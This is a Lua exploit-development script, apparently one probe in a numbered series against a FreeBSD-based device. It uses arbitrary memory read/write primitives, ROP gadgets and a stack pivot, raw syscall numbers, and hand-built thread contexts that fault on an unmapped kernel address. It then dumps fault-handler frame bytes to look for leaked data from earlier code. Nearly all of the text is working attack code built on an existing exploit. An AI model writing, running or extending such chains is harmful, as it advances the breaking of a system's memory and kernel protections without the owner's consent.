-- CRASH_CLASS: MODERATE
-- PROBE 1057a: what else is in the fault context beyond the error word?
--
-- The handler gets the thread context in RDX. 995a-1006a only ever read ctx+0xC8..ctx+0x138
-- (address, class, error word). The FreeBSD mcontext puts the FPU save area after the
-- general registers, and the kernel only writes it when the thread owns the FPU, so if the
-- save area is not cleared the frame may carry bytes from whatever ran on this thread
-- before. Dump four 0x80 chunks past the known fields and print them verbatim, so the
-- question "is there anything in the frame that is not ours" is answered by data.
print("=== PROBE 1057a: fault frame contents beyond the error word ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end
local function hex(v) return string.format("%X", v) end

local sc_pid = mk(20)
print(string.format("[0] pid=%d fd=%d", to_num(sc_pid(uint64(0))), rd(signal.fd_addr) or 0))

-- the faulting thread: jump at an unmapped kernel page, one per chunk
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local function build(off)
    local hc = ropchain({ stack_base = to_num(ph.pivot_addr) })
    hc:push_store_rdx_into_memory(ctxt)
    hc:push_syscall_raw(syscall.write, function()
        hc:push_set_rdx(0x80)
        hc:push_set_rax_from_memory(ctxt)
        hc:push_add_to_rax(off)
        hc:push_set_reg_from_rax("rsi")
        hc:push_set_reg_from_memory("rdi", signal.fd_addr)
    end)
    hc:push_syscall_raw(mk(431), function() hc:push_set_rdi(0) end)
    return hc
end
build(0x100)
print("[1] handler chain built")

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RAX=0x078}
local pop_rax = as_addr(gadgets["pop rax; ret"])
local jmp     = as_addr(gadgets["jmp $"])
local ctx = memory.alloc(0x500); local ctxa = as_addr(ctx)
local tb = memory.alloc(8); local tba = as_addr(tb)
local stack = memory.alloc(0x1000); local stacka = as_addr(stack)
if pop_rax==0 or ctxa==0 or stacka==0 then print("[!] setup failed"); return end
print(string.format("[2] ctx=%X stack=%X jmp=%X", ctxa, stacka, jmp))

for _, off in ipairs({0x40, 0x100, 0x180, 0x200}) do
    build(off)
    -- chain: pop rax; UNMAPPED; jmp $   (the load of UNMAPPED is not needed, the fault is
    -- on the instruction fetch or on the ret, either way the handler sees the context)
    wq(stacka + 0x00, pop_rax)
    wq(stacka + 0x08, 0xFFFFFFFFE0000000)
    wq(stacka + 0x10, jmp)
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end
    wq(ctxa + Ctx.MAGIC, 0x480); wq(ctxa + Ctx.TYPE, 0x10000)
    wq(ctxa + Ctx.CS, 0x43); wq(ctxa + Ctx.SS, 0x3B)
    wq(ctxa + Ctx.RIP, pop_rax); wq(ctxa + Ctx.RSP, stacka); wq(ctxa + Ctx.RAX, 20)
    wq(tba, 0)
    print(string.format(">off=0x%X", off))
    pcall(function() return mk(430)(uint64(ctxa), uint64(tba), uint64(0)) end)
    local ts = memory.alloc(16)
    wq(as_addr(ts), 0); wq(as_addr(ts)+8, 120*1000000)
    pcall(function() mk(240)(uint64(as_addr(ts)), uint64(0)) end)
end
print(string.format("[E] alive pid=%d", to_num(sc_pid(uint64(0)))))
print("=== COMPLETE ===")
